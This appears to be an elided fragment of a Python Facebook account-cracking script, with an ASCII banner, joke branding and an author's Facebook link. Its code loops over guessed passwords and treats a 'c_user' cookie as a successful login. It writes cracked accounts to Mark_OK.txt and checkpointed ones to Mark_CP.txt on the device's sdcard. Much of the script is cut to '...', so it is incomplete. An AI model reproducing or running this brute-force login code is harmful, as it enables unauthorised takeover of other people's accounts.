...
'\x1b[1;92m'|__/     |__/|__/  |__/|__/  |__/|__/  \_
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : https://www.facebook.com/izt.pinik.Ariyan.Sakib
...
def R():
			...
			print ("\033[1m [!] Tool    : MARK ZUCKERBERG")

			print (" [!] Brand   : MARK RAKIB")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/Mark_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Mark_CP.txt' , 'a').write('%s\n' % wrt)
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/izt.pinik.Ariyan.Sakib")
